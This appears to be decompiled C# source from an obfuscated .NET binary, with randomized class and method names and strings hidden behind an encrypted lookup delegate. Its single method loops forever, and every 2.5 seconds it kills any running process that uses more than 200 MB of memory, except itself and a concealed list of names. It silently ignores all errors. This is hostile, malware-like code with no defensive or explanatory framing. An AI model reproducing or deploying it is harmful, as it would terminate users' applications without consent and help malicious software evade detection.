using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gZJMShdGuoGG;

public static class pBQHnVpNuPdMIvv
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void kKboxjQaZakdWlW()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107404596)) && !process.ProcessName.Contains(getString_0(107404555)) && !process.ProcessName.Contains(getString_0(107404546)) && !process.ProcessName.Contains(getString_0(107404569)) && !process.ProcessName.Contains(getString_0(107404524)) && !process.ProcessName.Contains(getString_0(107404511)) && !process.ProcessName.Contains(getString_0(107404530)) && !process.ProcessName.Contains(getString_0(107404485)) && !process.ProcessName.Contains(getString_0(107404504)) && !process.ProcessName.Contains(getString_0(107404459)) && !process.ProcessName.Contains(getString_0(107404470)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static pBQHnVpNuPdMIvv()
	{
		Strings.CreateGetStringDelegate(typeof(pBQHnVpNuPdMIvv));
	}
}
